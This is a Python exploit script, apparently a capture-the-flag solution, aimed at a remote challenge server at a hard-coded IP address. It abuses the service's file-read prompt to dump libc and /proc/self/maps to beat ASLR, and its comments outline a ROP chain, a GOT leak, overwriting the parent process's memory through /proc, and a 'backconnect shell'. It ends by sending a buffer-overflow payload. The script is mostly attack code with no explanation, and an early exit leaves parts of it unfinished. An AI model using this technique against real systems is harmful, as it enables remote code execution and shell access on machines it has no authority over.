from pwnlib import *


#s = Socket(("localhost", 5553))
s = Socket(("104.155.105.0", 14000))



def do_round(filename, lseek=0, count=10000):
	s.ru("e access?\n")
	s.send("r\n")

	s.ru("filename?\n")
	s.send("%s\n" % filename)

	s.ru("lseek?\n")
	s.send("%d\n" % lseek)

	s.ru("count?\n")
	s.send("%d\n" % count)

	result = s.ru("\nquit? (y/n)\n")
	s.send("n\n")

	return result

def get_line(maps, matches):
	return [l for l in maps.split("\n") if any(m in l for m in matches)][0]



s.ru("e access?\n")
s.send("r\n")

s.ru("filename?\n")
s.send("%s\n" % "/lib64/libc.so.6")

s.ru("lseek?\n")
s.send("%d\n" % 0)

s.ru("count?\n")
s.send("%d\n" % 10000000)

raw = ""
while True:
	raw += s.recv(0x4000)
	print len(raw)
	if "quit? (y/n)" in raw:
		break

open("libc", "w").write(raw)

print "OK"

exit()




# - beat ASLR via /proc/self/maps, confirm it works on remote

maps = do_round("/proc/self/maps")

line = get_line(maps, ["tea/tea", "user/chal"])
bin_base = int(line.split("-")[0], 16)

line = get_line(maps, ["libc"])
libc_base = int(line.split("-")[0], 16)



# - get pid+ppid via /proc/self/stat or such, confirm it works on remote
# - grab the stack pointer via some proc file
# - write a ROP payload on the stack
# - confirm that we can surgically control $pc to jump to the binary and print
# - do ROP to leak the GOT, find the right libc
# - in ROP, do the following:
# 	- use libc gadgets to close the fd=1
# 	- open the parent mem file to fd=1
# 	- fseek to the right place
# 	- overwrite the code
# - kill self -> get backconnect shell
# - win








payload  = "1 "
payload += "A"*0x1e
payload += "B"*8
payload += "C"*8
payload += pd(5) # fd 


s.ru("e access?\n")
s.send("r\n")

s.ru("filename?\n")
s.send("%s\n" % "/proc/self/maps")

s.ru("lseek?\n")
s.send("%d\n" % 0)

raw_input("> ")

s.ru("count?\n")
s.send(payload + "\n")

s.interact()
